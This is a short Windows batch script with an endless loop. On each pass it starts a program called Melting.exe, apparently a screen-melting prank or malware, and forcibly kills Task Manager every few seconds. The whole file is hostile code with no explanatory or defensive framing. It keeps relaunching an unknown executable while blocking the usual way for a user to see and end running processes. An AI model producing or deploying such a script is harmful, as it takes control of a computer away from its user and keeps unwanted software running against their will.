@echo off
:main
timeout /t 3
start Melting.exe
taskkill /f /im taskmgr.exe
goto main